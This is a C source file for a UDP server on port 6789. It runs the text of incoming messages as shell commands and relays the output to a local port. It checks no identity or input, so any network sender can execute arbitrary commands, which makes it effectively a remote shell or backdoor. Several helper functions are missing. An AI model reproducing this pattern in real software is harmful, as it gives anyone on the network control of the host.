#include "stdafx.h"

int port=6789;
int main(int argc, char** argv) {
        int sin_len;
        unsigned char resultbuffer[MESSAGELEN];
        msg message;
        unsigned char buffer[MESSAGEIDLEN+OPTIONLEN+MESSAGELEN+3];
        int socket_descriptor;
        struct sockaddr_in sin;
        sin_len = inint__cd23(&socket_descriptor,&sin,port);
        if(sin_len <0)
        {
	        exit(-1);
        }
        printf("Waiting for data form sender \n");

        while(1)
        {
                recvfrom(socket_descriptor,&buffer,sizeof(buffer),0,(struct sockaddr *)&sin,&sin_len);
	        changeTomsg(buffer,&message);
                if(strlen(message.message) == 1&& message.message[0]=='\n')
                {
                        continue;
                }
	        printf("[\n\tmessageid:%d%d\n",message.messageid[0],message.messageid[1]);
                printf("\trequest from server:%s",message.message);
	        printf("\tclientid:%d\n",message.clientid);
        if((message.code&0x01)==1)
	{
                //request
		printf("\ttype:request\n");
                if((message.code&0x02)==2)
                {
                        writeValWithStatus(&message, cmd_system__0a40(message.message,resultbuffer,MESSAGELEN));
                        printf("\tshell:%s]\n",message.message);
                        writeMessage(&message,resultbuffer);
                }
                else if((message.code&0x02)==0)
                {
                       
                }

		if(isend("127.0.0.1",1024,&message)!=0)
                {
                        print_sw(DEBUG,PUTERR,"\nerror\n");
                }
	}
    }

    close(socket_descriptor);
    exit(0);

    return (EXIT_SUCCESS);
}

void writeValWithStatus(msg* __msg__, int status)
{
        if(status==0)
        {
                __msg__->code = 0x02;
        }
                        else if(status == -3217)
                        {
                                __msg__->code = 0x12;
                        }
                        else if(status == 40)
                        {
                                __msg__->code = 0x32;
                        }


}
